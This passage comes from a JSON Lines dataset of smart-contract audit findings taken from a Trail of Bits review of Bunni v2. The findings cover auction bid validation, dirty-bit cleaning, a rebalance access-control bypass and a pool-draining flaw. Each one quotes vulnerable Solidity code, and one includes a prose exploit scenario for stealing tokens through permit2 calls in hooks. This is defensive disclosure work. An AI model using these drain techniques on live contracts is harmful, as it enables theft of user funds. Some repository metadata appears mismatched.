specifications.\n\n#### References\n\n● am-AMM: An [Auction-Managed](https://arxiv.org/abs/2403.03367) Automated Market Maker\n", "severity": "Low", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-BUNNI-3", "target": {"path": "src/AmAmm.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Bunniapp/biddog", "org": "Bunniapp", "name": "biddog", "commit": "95f4270ad4447e96044973580afda9176730e7c8", "branch": null, "relative_file": "src/AmAmm.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-3", "Target": "src/AmAmm.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-004", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 4, "page_start": 27, "title": "Users can bid arbitrarily low rent during the bidding process", "short_summary": null, "description_md": "#### Description\n\nDuring the am-AMM auction bidding process, a user vying to be a future manager can bid extremely low rent, even zero, in the absence of a current am-AMM manager or next bids, distorting the bidding process.\n\nAs depicted in figure 4.1, in function bid in the AmAmm contract, when a user places a new bid, the rent is compared with the existing next bid rent and is set as the next bid if the rent is 10% more than the existing next bid rent. In the absence of an existing next bid, the user's rent can be zero and still pass the sanity checks. As a result, future bidders may also opt for bidding low rent, aiming to be just above 10% of the previous rent.\n\n```\n// update state machine\n_updateAmAmmWrite(id);\n// ensure bid is valid\n// - manager can't be zero address\n// - bid needs to be greater than the next bid by >10%\n// - deposit needs to cover the rent for K hours\n// - deposit needs to be a multiple of rent\n// - payload needs to be valid\nif (\n manager == address(0) || rent <=\n_nextBids[id].rent.mulWad(MIN_BID_MULTIPLIER(id)) || deposit < rent * K(id)\n || deposit % rent != 0 || !_payloadIsValid(id, payload)\n) {\n revert AmAmm__InvalidBid();\n}\n```\n\n*Figure 4.1: A snippet of the bid function in the AmAmm contract ([src/AmAmm.sol#L75–L86](https://github.com/Bunniapp/biddog/blob/95f4270ad4447e96044973580afda9176730e7c8/src/AmAmm.sol#L75-L86))*\n\nMoreover, as illustrated in figure 4.2, in the function \\_stateTransitionWrite in the contract AmAmm where the new manager is set, a remarkably low next bid rent could still become the manager if there is no existing top bid, given that the rent must be greater than 10% of the existing top bid rent. This scenario allows the winning bidder to attain the manager's role at a substantially low rent and earn significantly more in swap fees.\n\n\n```\n// State D\n// we charge rent from the top bid only until K epochs after the next bid was\nsubmitted\n// assuming the next bid's rent is greater than the top bid's rent + 10%, otherwise\nwe don't care about\n// the next bid\nbool nextBidIsBetter = nextBid.rent > topBid.rent.mulWad(MIN_BID_MULTIPLIER(id));\nuint40 epochsPassed;\n```\n\n*Figure 4.2: A snippet of the \\_stateTransitionWrite function in the AmAmm contract ([src/AmAmm.sol#L676–L680](https://github.com/Bunniapp/biddog/blob/95f4270ad4447e96044973580afda9176730e7c8/src/AmAmm.sol#L676-L680))*\n", "full_markdown": "| 4. Users can bid arbitrarily low rent during the bidding process |                               |\n|------------------------------------------------------------------------------------------------|-------------------------------|\n| Severity: Undetermined                                                                      | Diffi culty: Low        |\n| Type: Data Validation                                                                    | Finding ID: TOB-BUNNI-4 |\n| Target: lib/biddog/AmAMM.sol                                                                |                               |\n\n#### Description\n\nDuring the am-AMM auction bidding process, a user vying to be a future manager can bid extremely low rent, even zero, in the absence of a current am-AMM manager or next bids, distorting the bidding process.\n\nAs depicted in figure 4.1, in function bid in the AmAmm contract, when a user places a new bid, the rent is compared with the existing next bid rent and is set as the next bid if the rent is 10% more than the existing next bid rent. In the absence of an existing next bid, the user's rent can be zero and still pass the sanity checks. As a result, future bidders may also opt for bidding low rent, aiming to be just above 10% of the previous rent.\n\n```\n// update state machine\n_updateAmAmmWrite(id);\n// ensure bid is valid\n// - manager can't be zero address\n// - bid needs to be greater than the next bid by >10%\n// - deposit needs to cover the rent for K hours\n// - deposit needs to be a multiple of rent\n// - payload needs to be valid\nif (\n manager == address(0) || rent <=\n_nextBids[id].rent.mulWad(MIN_BID_MULTIPLIER(id)) || deposit < rent * K(id)\n || deposit % rent != 0 || !_payloadIsValid(id, payload)\n) {\n revert AmAmm__InvalidBid();\n}\n```\n\n*Figure 4.1: A snippet of the bid function in the AmAmm contract ([src/AmAmm.sol#L75–L86](https://github.com/Bunniapp/biddog/blob/95f4270ad4447e96044973580afda9176730e7c8/src/AmAmm.sol#L75-L86))*\n\nMoreover, as illustrated in figure 4.2, in the function \\_stateTransitionWrite in the contract AmAmm where the new manager is set, a remarkably low next bid rent could still become the manager if there is no existing top bid, given that the rent must be greater than 10% of the existing top bid rent. This scenario allows the winning bidder to attain the manager's role at a substantially low rent and earn significantly more in swap fees.\n\n\n```\n// State D\n// we charge rent from the top bid only until K epochs after the next bid was\nsubmitted\n// assuming the next bid's rent is greater than the top bid's rent + 10%, otherwise\nwe don't care about\n// the next bid\nbool nextBidIsBetter = nextBid.rent > topBid.rent.mulWad(MIN_BID_MULTIPLIER(id));\nuint40 epochsPassed;\n```\n\n*Figure 4.2: A snippet of the \\_stateTransitionWrite function in the AmAmm contract ([src/AmAmm.sol#L676–L680](https://github.com/Bunniapp/biddog/blob/95f4270ad4447e96044973580afda9176730e7c8/src/AmAmm.sol#L676-L680))*\n\n#### Recommendations\n\nShort term, implement a minimum rent requirement to ensure that there is a lowest acceptable bid that a bidder must provide to qualify for consideration as the next bid.\n", "severity": "Undetermined", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-BUNNI-4", "target": {"path": "lib/biddog/AmAMM.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Bunniapp/biddog", "org": "Bunniapp", "name": "biddog", "commit": "95f4270ad4447e96044973580afda9176730e7c8", "branch": null, "relative_file": "lib/biddog/AmAMM.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Undetermined", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-4", "Target": "lib/biddog/AmAMM.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-005", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 5, "page_start": 29, "title": "Dirty bits of narrow types are not cleaned", "short_summary": null, "description_md": "#### Description\n\nThe SwapMath library used by Bunni v2 is based on the library of the same name from Uniswap v4. However, the getSqrtPriceTarget function in the Uniswap library has been updated to properly clean the higher bits of the sqrtPrice\\* parameters. Solidity makes no guarantees about the contents of these unused bits in the case of types smaller than one word (e.g., uint24, uint160, address).\n\n```\nfunction getSqrtPriceTarget(bool zeroForOne, uint160 sqrtPriceNextX96, uint160\nsqrtPriceLimitX96)\n internal\n pure\n returns (uint160 sqrtPriceTargetX96)\n{\n assembly {\n // a flag to toggle between sqrtPriceNextX96 and sqrtPriceLimitX96\n // when zeroForOne == true, nextOrLimit reduces to sqrtPriceNextX96 >=\nsqrtPriceLimitX96\n // sqrtPriceTargetX96 = max(sqrtPriceNextX96, sqrtPriceLimitX96)\n // when zeroForOne == false, nextOrLimit reduces to sqrtPriceNextX96 <\nsqrtPriceLimitX96\n // sqrtPriceTargetX96 = min(sqrtPriceNextX96, sqrtPriceLimitX96)\n let nextOrLimit := xor(lt(sqrtPriceNextX96, sqrtPriceLimitX96), zeroForOne)\n let symDiff := xor(sqrtPriceNextX96, sqrtPriceLimitX96)\n sqrtPriceTargetX96 := xor(sqrtPriceLimitX96, mul(symDiff, nextOrLimit))\n }\n}\n```\n\n*Figure 5.1: The body of the getSqrtPriceTarget function in the Bunni v2 SwapMath contract, showing the 160-bit values being used directly ([src/lib/SwapMath.sol#L19–L34](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/SwapMath.sol#L19-L34))*\n\n```\nfunction getSqrtPriceTarget(bool zeroForOne, uint160 sqrtPriceNextX96, uint160\nsqrtPriceLimitX96)\n internal\n pure\n returns (uint160 sqrtPriceTargetX96)\n{\n assembly (\"memory-safe\") {\n // a flag to toggle between sqrtPriceNextX96 and sqrtPriceLimitX96\n```\n\n\n```\n // when zeroForOne == true, nextOrLimit reduces to sqrtPriceNextX96 >=\nsqrtPriceLimitX96\n // sqrtPriceTargetX96 = max(sqrtPriceNextX96, sqrtPriceLimitX96)\n // when zeroForOne == false, nextOrLimit reduces to sqrtPriceNextX96 <\nsqrtPriceLimitX96\n // sqrtPriceTargetX96 = min(sqrtPriceNextX96, sqrtPriceLimitX96)\n sqrtPriceNextX96 := and(sqrtPriceNextX96,\n0xffffffffffffffffffffffffffffffffffffffff)\n sqrtPriceLimitX96 := and(sqrtPriceLimitX96,\n0xffffffffffffffffffffffffffffffffffffffff)\n let nextOrLimit := xor(lt(sqrtPriceNextX96, sqrtPriceLimitX96),\nand(zeroForOne, 0x1))\n let symDiff := xor(sqrtPriceNextX96, sqrtPriceLimitX96)\n sqrtPriceTargetX96 := xor(sqrtPriceLimitX96, mul(symDiff, nextOrLimit))\n }\n}\n```\n\n*Figure 5.2: The body of the getSqrtPriceTarget function in the Uniswap v4 SwapMath contract, showing the high bits of the values being cleared before being used ([src/libraries/SwapMath.sol#L20–L37](https://github.com/Uniswap/v4-core/blob/9293e5ab1deed87e03c176d8af94b1af19eb3900/src/libraries/SwapMath.sol#L20-L37))*\n", "full_markdown": "## 5. Dirty bits of narrow types are not cleaned\n\n| Severity: Informational      | Diffi culty: High       |\n|---------------------------------|-------------------------------|\n| Type: Data Validation     | Finding ID: TOB-BUNNI-5 |\n| Target: src/lib/SwapMath.sol |                               |\n\n#### Description\n\nThe SwapMath library used by Bunni v2 is based on the library of the same name from Uniswap v4. However, the getSqrtPriceTarget function in the Uniswap library has been updated to properly clean the higher bits of the sqrtPrice\\* parameters. Solidity makes no guarantees about the contents of these unused bits in the case of types smaller than one word (e.g., uint24, uint160, address).\n\n```\nfunction getSqrtPriceTarget(bool zeroForOne, uint160 sqrtPriceNextX96, uint160\nsqrtPriceLimitX96)\n internal\n pure\n returns (uint160 sqrtPriceTargetX96)\n{\n assembly {\n // a flag to toggle between sqrtPriceNextX96 and sqrtPriceLimitX96\n // when zeroForOne == true, nextOrLimit reduces to sqrtPriceNextX96 >=\nsqrtPriceLimitX96\n // sqrtPriceTargetX96 = max(sqrtPriceNextX96, sqrtPriceLimitX96)\n // when zeroForOne == false, nextOrLimit reduces to sqrtPriceNextX96 <\nsqrtPriceLimitX96\n // sqrtPriceTargetX96 = min(sqrtPriceNextX96, sqrtPriceLimitX96)\n let nextOrLimit := xor(lt(sqrtPriceNextX96, sqrtPriceLimitX96), zeroForOne)\n let symDiff := xor(sqrtPriceNextX96, sqrtPriceLimitX96)\n sqrtPriceTargetX96 := xor(sqrtPriceLimitX96, mul(symDiff, nextOrLimit))\n }\n}\n```\n\n*Figure 5.1: The body of the getSqrtPriceTarget function in the Bunni v2 SwapMath contract, showing the 160-bit values being used directly ([src/lib/SwapMath.sol#L19–L34](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/SwapMath.sol#L19-L34))*\n\n```\nfunction getSqrtPriceTarget(bool zeroForOne, uint160 sqrtPriceNextX96, uint160\nsqrtPriceLimitX96)\n internal\n pure\n returns (uint160 sqrtPriceTargetX96)\n{\n assembly (\"memory-safe\") {\n // a flag to toggle between sqrtPriceNextX96 and sqrtPriceLimitX96\n```\n\n\n```\n // when zeroForOne == true, nextOrLimit reduces to sqrtPriceNextX96 >=\nsqrtPriceLimitX96\n // sqrtPriceTargetX96 = max(sqrtPriceNextX96, sqrtPriceLimitX96)\n // when zeroForOne == false, nextOrLimit reduces to sqrtPriceNextX96 <\nsqrtPriceLimitX96\n // sqrtPriceTargetX96 = min(sqrtPriceNextX96, sqrtPriceLimitX96)\n sqrtPriceNextX96 := and(sqrtPriceNextX96,\n0xffffffffffffffffffffffffffffffffffffffff)\n sqrtPriceLimitX96 := and(sqrtPriceLimitX96,\n0xffffffffffffffffffffffffffffffffffffffff)\n let nextOrLimit := xor(lt(sqrtPriceNextX96, sqrtPriceLimitX96),\nand(zeroForOne, 0x1))\n let symDiff := xor(sqrtPriceNextX96, sqrtPriceLimitX96)\n sqrtPriceTargetX96 := xor(sqrtPriceLimitX96, mul(symDiff, nextOrLimit))\n }\n}\n```\n\n*Figure 5.2: The body of the getSqrtPriceTarget function in the Uniswap v4 SwapMath contract, showing the high bits of the values being cleared before being used ([src/libraries/SwapMath.sol#L20–L37](https://github.com/Uniswap/v4-core/blob/9293e5ab1deed87e03c176d8af94b1af19eb3900/src/libraries/SwapMath.sol#L20-L37))*\n\n#### Recommendations\n\nShort term, update the getSqrtPriceTarget function to clear the higher-order bits before using them.\n\nLong term, regularly review the sources of any modified third-party code to ensure you use the most up-to-date version and benefit from any security improvements.\n", "severity": "Informational", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-BUNNI-5", "target": {"path": "src/lib/SwapMath.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Uniswap/v4-core", "org": "Uniswap", "name": "v4-core", "commit": "9293e5ab1deed87e03c176d8af94b1af19eb3900", "branch": null, "relative_file": "src/lib/SwapMath.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-BUNNI-5", "Target": "src/lib/SwapMath.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-006", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 6, "page_start": 31, "title": "Rebalance mechanism access control can be bypassed", "short_summary": null, "description_md": "#### Description\n\nThe access controls of the rebalance mechanism are ineffective, allowing anyone to execute the pre- and post-hooks of the mechanism.\n\nOnce a rebalance order is created, users can fulfill this order by calling one of the fulfillOrder functions of the FloodPlain contract. The functions will make a call to the BunniZone, if it is defined, in order to validate the caller, as shown in figure 6.1:\n\n```\nfunction fulfillOrder(SignedOrder calldata package) external payable nonReentrant {\n Order calldata order = package.order;\n bytes32 orderHash = order.hash();\n // Check zone accepts the fulfiller. Fulfiller is msg.sender in direct fills.\n if (order.zone != address(0)) if (!(IZone(order.zone).validate(order,\nmsg.sender))) revert ZoneDenied();\n // Execute pre hooks.\n order.preHooks.execute();\n // Transfer each offer item to msg.sender using Permit2.\n _permitTransferOffer(order, package.signature, orderHash, msg.sender);\n // Transfer consideration item from msg.sender to offerer.\n uint256 amount = order.consideration.amount;\n IERC20(order.consideration.token).safeTransferFrom(msg.sender, order.recipient,\namount);\n // Execute post hooks.\n order.postHooks.execute();\n // Emit an event signifying that the order has been fulfilled.\n emit OrderFulfilled(orderHash, order.zone, msg.sender, amount);\n}\n```\n\n*Figure 6.1: One of the fulfillOrder functions ([flood-contracts/master/src/FloodPlain.sol#L55–L78](https://github.com/flood-protocol/flood-contracts/blob/c9891965b29f8e32ed00d9b98356a0833f806e18/src/FloodPlain.sol#L55-L78))*\n\n\nHowever, as figure 6.2 shows, the BunniZone does not perform any validation on the contents of the order, but only on the fulfiller (msg.sender in the highlighted line of figure 6.1):\n\n```\nfunction validate(IFloodPlain.Order calldata order, address fulfiller) external view\nreturns (bool) {\n // extract PoolKey from order's preHooks\n IBunniHook.RebalanceOrderHookArgs memory hookArgs =\n abi.decode(order.preHooks[0].data[4:], (IBunniHook.RebalanceOrderHookArgs));\n PoolKey memory key = hookArgs.key;\n PoolId id = key.toId();\n // query the hook for the am-AMM manager\n IAmAmm amAmm = IAmAmm(address(key.hooks));\n IAmAmm.Bid memory topBid = amAmm.getTopBid(id);\n // allow fulfiller if they are whitelisted or if they are the am-AMM manager\n return isWhitelisted[fulfiller] || topBid.manager == fulfiller;\n}\n```\n\n*Figure 6.2: The validate function ([src/BunniZone.sol#L41–L54](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniZone.sol#L41-L54))*\n\nThis allows anyone to execute the pre- and post-hooks by creating a fake order and then inserting a real order into the preHooks and postHooks arrays.\n\nAdditionally, the BunniHook contract considers the poolId of the created order combined with the order hash to be a valid permit signature, as visible in figures 6.3 and 6.4:\n\n```\nfunction _createRebalanceOrder(\n HookStorage storage s,\n Env calldata env,\n PoolId id,\n PoolKey memory key,\n uint16 rebalanceOrderTTL,\n Currency inputToken,\n Currency outputToken,\n uint256 inputAmount,\n uint256 outputAmount\n) internal {\n // ...\n // approve input token to permit2\n if (inputERC20Token.allowance(address(this), env.permit2) < inputAmount) {\n address(inputERC20Token).safeApproveWithRetry(env.permit2,\ntype(uint256).max);\n }\n // etch order so fillers can pick it up\n // use PoolId as signature to enable isValidSignature() to find the correct\norder hash\n IOnChainOrders(address(env.floodPlain)).etchOrder(\n```\n\n\n```\n IFloodPlain.SignedOrder({order: order, signature: abi.encode(id)})\n );\n}\n```\n\n*Figure 6.3: The rebalance order signature creation in the \\_createRebalanceOrder function ([src/lib/BunniHookLogic.sol#L733–L743](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L733-L743))*\n\n```\nfunction isValidSignature(bytes32 hash, bytes memory signature)\n external\n view\n override\n returns (bytes4 magicValue)\n{\n // verify rebalance order\n PoolId id = abi.decode(signature, (PoolId)); // we use the signature field to\nstore the pool id\n if (s.rebalanceOrderHash[id] == hash) {\n return this.isValidSignature.selector;\n }\n}\n```\n\n*Figure 6.4: The rebalance order signature verification in the isValidSignature function ([src/BunniHook.sol#L120–L131](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L120-L131))*\n\nSince the FloodPlain contract allows arbitrary functions to be executed on arbitrary targets, this contract has a high-severity vulnerability where a call to permit2 can be inserted into the preHooks or postHooks array in order to consume the permit2 coupon for other users and steal their tokens.\n\nDue to this, anyone can drain the balance of the BunniHook contract for any token that has an outstanding rebalance order by inserting a call to permit2 into the preHooks or postHooks arrays with the correct witness, witnessTypeString, and poolId variables but a changed receiver address.\n", "full_markdown": "# 6. Rebalance mechanism access control can be bypassed Severity: **High** Difficulty: **Low** Type: Access Controls Finding ID: TOB-BUNNI-6 Target: src/BunniHook.sol, src/lib/BunniHookLogic.sol\n\n#### Description\n\nThe access controls of the rebalance mechanism are ineffective, allowing anyone to execute the pre- and post-hooks of the mechanism.\n\nOnce a rebalance order is created, users can fulfill this order by calling one of the fulfillOrder functions of the FloodPlain contract. The functions will make a call to the BunniZone, if it is defined, in order to validate the caller, as shown in figure 6.1:\n\n```\nfunction fulfillOrder(SignedOrder calldata package) external payable nonReentrant {\n Order calldata order = package.order;\n bytes32 orderHash = order.hash();\n // Check zone accepts the fulfiller. Fulfiller is msg.sender in direct fills.\n if (order.zone != address(0)) if (!(IZone(order.zone).validate(order,\nmsg.sender))) revert ZoneDenied();\n // Execute pre hooks.\n order.preHooks.execute();\n // Transfer each offer item to msg.sender using Permit2.\n _permitTransferOffer(order, package.signature, orderHash, msg.sender);\n // Transfer consideration item from msg.sender to offerer.\n uint256 amount = order.consideration.amount;\n IERC20(order.consideration.token).safeTransferFrom(msg.sender, order.recipient,\namount);\n // Execute post hooks.\n order.postHooks.execute();\n // Emit an event signifying that the order has been fulfilled.\n emit OrderFulfilled(orderHash, order.zone, msg.sender, amount);\n}\n```\n\n*Figure 6.1: One of the fulfillOrder functions ([flood-contracts/master/src/FloodPlain.sol#L55–L78](https://github.com/flood-protocol/flood-contracts/blob/c9891965b29f8e32ed00d9b98356a0833f806e18/src/FloodPlain.sol#L55-L78))*\n\n\nHowever, as figure 6.2 shows, the BunniZone does not perform any validation on the contents of the order, but only on the fulfiller (msg.sender in the highlighted line of figure 6.1):\n\n```\nfunction validate(IFloodPlain.Order calldata order, address fulfiller) external view\nreturns (bool) {\n // extract PoolKey from order's preHooks\n IBunniHook.RebalanceOrderHookArgs memory hookArgs =\n abi.decode(order.preHooks[0].data[4:], (IBunniHook.RebalanceOrderHookArgs));\n PoolKey memory key = hookArgs.key;\n PoolId id = key.toId();\n // query the hook for the am-AMM manager\n IAmAmm amAmm = IAmAmm(address(key.hooks));\n IAmAmm.Bid memory topBid = amAmm.getTopBid(id);\n // allow fulfiller if they are whitelisted or if they are the am-AMM manager\n return isWhitelisted[fulfiller] || topBid.manager == fulfiller;\n}\n```\n\n*Figure 6.2: The validate function ([src/BunniZone.sol#L41–L54](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniZone.sol#L41-L54))*\n\nThis allows anyone to execute the pre- and post-hooks by creating a fake order and then inserting a real order into the preHooks and postHooks arrays.\n\nAdditionally, the BunniHook contract considers the poolId of the created order combined with the order hash to be a valid permit signature, as visible in figures 6.3 and 6.4:\n\n```\nfunction _createRebalanceOrder(\n HookStorage storage s,\n Env calldata env,\n PoolId id,\n PoolKey memory key,\n uint16 rebalanceOrderTTL,\n Currency inputToken,\n Currency outputToken,\n uint256 inputAmount,\n uint256 outputAmount\n) internal {\n // ...\n // approve input token to permit2\n if (inputERC20Token.allowance(address(this), env.permit2) < inputAmount) {\n address(inputERC20Token).safeApproveWithRetry(env.permit2,\ntype(uint256).max);\n }\n // etch order so fillers can pick it up\n // use PoolId as signature to enable isValidSignature() to find the correct\norder hash\n IOnChainOrders(address(env.floodPlain)).etchOrder(\n```\n\n\n```\n IFloodPlain.SignedOrder({order: order, signature: abi.encode(id)})\n );\n}\n```\n\n*Figure 6.3: The rebalance order signature creation in the \\_createRebalanceOrder function ([src/lib/BunniHookLogic.sol#L733–L743](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHookLogic.sol#L733-L743))*\n\n```\nfunction isValidSignature(bytes32 hash, bytes memory signature)\n external\n view\n override\n returns (bytes4 magicValue)\n{\n // verify rebalance order\n PoolId id = abi.decode(signature, (PoolId)); // we use the signature field to\nstore the pool id\n if (s.rebalanceOrderHash[id] == hash) {\n return this.isValidSignature.selector;\n }\n}\n```\n\n*Figure 6.4: The rebalance order signature verification in the isValidSignature function ([src/BunniHook.sol#L120–L131](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHook.sol#L120-L131))*\n\nSince the FloodPlain contract allows arbitrary functions to be executed on arbitrary targets, this contract has a high-severity vulnerability where a call to permit2 can be inserted into the preHooks or postHooks array in order to consume the permit2 coupon for other users and steal their tokens.\n\nDue to this, anyone can drain the balance of the BunniHook contract for any token that has an outstanding rebalance order by inserting a call to permit2 into the preHooks or postHooks arrays with the correct witness, witnessTypeString, and poolId variables but a changed receiver address.\n\n#### Exploit Scenario\n\nA pool contains 10,000 USDC and 20,000 USDT, and a rebalance order is created to sell 5,000 USDT and get 5,000 USDC. Eve creates a fake order that contains the actual rebalance pre- and post-hook in the preHooks array, but leaves the postHooks array empty. The output amount is pulled from the BunniHub contract and stays in the BunniHook contract. Eve then creates another fake order and inserts a call to the permit2 contract's permitWitnessTransferFrom function in the preHooks array to transfer the amount to herself. This passes since the signature is considered valid whenever the correct hash and PoolId are supplied to the isValidSignature function and since the permit2 call was made from the FloodPlain contract.\n\n#### Recommendations\n\nShort term, do not deploy any pools with rebalancing enabled until Flood addresses this issue and undergoes a security review. Otherwise, consider either creating custom\n\n\n\nwrappers for interaction with the FloodPlain contract that would validate the order, caller, and the hooks at once, or using a different provider for order fulfillment.\n\nLong term, redesign the rebalance flow in order to connect the validation and execution of the rebalance actions. Ensure that this feature is thoroughly tested for common adversarial situations.\n", "severity": "High", "difficulty": "Low", "type": "Access Controls", "finding_id": "TOB-BUNNI-6", "target": {"path": "src/BunniHook.sol, src/lib/BunniHookLogic.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/Uniswap/v4-core", "org": "Uniswap", "name": "v4-core", "commit": "9293e5ab1deed87e03c176d8af94b1af19eb3900", "branch": null, "relative_file": "src/BunniHook.sol, src/lib/BunniHookLogic.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "Low", "Type": "Access Controls", "Finding ID": "TOB-BUNNI-6", "Target": "src/BunniHook.sol, src/lib/BunniHookLogic.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-007", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 7, "page_start": 35, "title": "Pools can be drained via the rebalance mechanism by selectively executing the rebalanceOrderPreHook and the rebalanceOrderPostHook", "short_summary": null, "description_md": "#### Description\n\nAny pool that has an active rebalance order can be drained because the BunniHook does not enforce that a rebalanceOrderPreHook and rebalanceOrderPostHook need to be executed together.\n\nWhen a rebalance order is fulfilled by using the fulfillOrder function of the FloodPlain contract, the actual data passed to the rebalanceOrderPreHook and rebalanceOrderPostHook functions is arbitrary, as shown in figures 7.1 and 7.2:\n\n```\nfunction fulfillOrder(SignedOrder calldata package) external payable nonReentrant {\n Order calldata order = package.order;\n bytes32 orderHash = order.hash();\n // Check zone accepts the fulfiller. Fulfiller is msg.sender in direct fills.\n if (order.zone != address(0)) if (!(IZone(order.zone).validate(order,\nmsg.sender))) revert ZoneDenied();\n // Execute pre hooks.\n order.preHooks.execute();\n // Transfer each offer item to msg.sender using Permit2.\n _permitTransferOffer(order, package.signature, orderHash, msg.sender);\n // Transfer consideration item from msg.sender to offerer.\n uint256 amount = order.consideration.amount;\n IERC20(order.consideration.token).safeTransferFrom(msg.sender, order.recipient,\namount);\n // Execute post hooks.\n order.postHooks.execute();\n // Emit an event signifying that the order has been fulfilled.\n emit OrderFulfilled(orderHash, order.zone, msg.sender, amount);\n}\n```\n\n*Figure 7.1: The fulfillOrder function ([flood-contracts/master/src/FloodPlain.sol#L55–L78](https://github.com/flood-protocol/flood-contracts/blob/c9891965b29f8e32ed00d9b98356a0833f806e18/src/FloodPlain.sol#L55-L78))*\n\n\n```\nfunction execute(IFloodPlain.Hook calldata hook) internal {\n address target = hook.target;\n bytes calldata data = hook.data;\n bytes28 extension;\n assembly (\"memory-safe\") {\n extension := shl(32, calldataload(data.offset))\n }\n require(extension != SELECTOR_EXTENSION, \"MALICIOUS_CALL\");\n assembly (\"memory-safe\") {\n let fmp := mload(0x40)\n calldatacopy(fmp, data.offset, data.length)\n if iszero(call(gas(), target, 0, fmp, data.length, 0, 0)) {\n returndatacopy(0, 0, returndatasize())\n revert(0, returndatasize())\n }\n }\n}\n```\n\n*Figure 7.2: The execute function called on the preHooks and postHooks array elements ([flood-contracts/master/src/lib/Hooks.sol#L9–L27](https://github.com/flood-protocol/flood-contracts/blob/c9891965b29f8e32ed00d9b98356a0833f806e18/src/libraries/Hooks.sol#L9-L27))*\n\nThe rebalanceOrderPreHook and rebalanceOrderPostHook functions do check that the data provided matches the hash of both order hooks in the respective functions, as shown in figures 7.3 and 7.4:\n\n```\nIBunniHook.RebalanceOrderHookArgs memory hookArgs =\nIBunniHook.RebalanceOrderHookArgs({\n key: key,\n preHookArgs: IBunniHook.RebalanceOrderPreHookArgs({currency: inputToken, amount:\ninputAmount}),\n postHookArgs: 